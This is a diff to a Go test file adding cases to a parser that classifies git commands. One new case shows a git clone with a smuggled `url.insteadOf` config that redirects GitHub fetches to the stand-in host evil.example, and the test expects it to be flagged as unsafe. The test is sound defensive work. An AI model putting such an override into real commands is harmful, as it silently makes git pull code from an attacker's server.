@@ -117,6 +117,8 @@ func TestParseIndicators(t *testing.T) {
 		{[]string{"git", "-C", "/r", "pull", "upstream", "main"}, "pull", "upstream", true},
 		{[]string{"git", "fetch", "--all"}, "fetch", "fetch", true},
 		{[]string{"git", "remote", "add", "origin", "https://github.com/x/y"}, "remote", "https://github.com/x/y", true},
+		{[]string{"git", "submodule", "update", "--init"}, "submodule", "submodule", true},
+		{[]string{"git", "-c", "url.https://evil.example/.insteadOf=https://github.com/", "clone", "https://github.com/x/y"}, "clone", "unsafe git config", true},
 		{[]string{"ls", "-la"}, "", "", false},
 	}
 	for _, c := range cases {
